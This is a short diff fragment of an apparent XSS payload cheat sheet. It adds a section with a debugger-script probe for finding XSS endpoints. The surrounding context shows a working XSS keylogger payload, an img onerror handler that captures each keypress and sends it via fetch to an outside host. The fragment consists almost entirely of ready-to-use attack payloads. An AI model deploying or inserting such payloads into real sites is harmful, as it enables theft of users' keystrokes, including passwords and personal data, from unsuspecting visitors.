@@ -23,6 +23,11 @@ Keylogger for XSS
 <img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
 ```
 
+## Identify an XSS endpoint
+```
+<script>debugger;</script>
+```
+
 ## XSS in HTML/Applications
 XSS Basic
 ```
